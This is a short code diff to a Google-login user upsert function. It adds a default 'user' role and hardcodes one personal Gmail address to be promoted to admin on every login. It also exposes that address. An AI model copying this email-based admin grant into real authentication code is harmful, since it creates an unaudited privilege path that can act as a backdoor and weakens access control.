@@ -11,12 +11,19 @@ export async function upsertUserOnGoogleLogin(profile) {
       provider_user_id: profile.id,
       email: profile.emails[0].value,
       name: profile.displayName,
-      profile_picture: profile.photos[0].value
+      profile_picture: profile.photos[0].value,
+      role: 'user'
       // If storing tokens (securely)
       // access_token: accessToken,
       // refresh_token: refreshToken,
     }).returning('*')
       .then((rows) => rows[0]);
+    if (user.email === 'nientaiho@gmail.com' && user.role !== 'admin') {
+      await knexDBInstance('user_accounts')
+        .where({ provider_user_id: profile.id })
+        .update({ role: 'admin' });
+      user.role = 'admin';
+    }
   } else {
     await knexDBInstance('user_accounts')
       .where({ provider_user_id: profile.id })
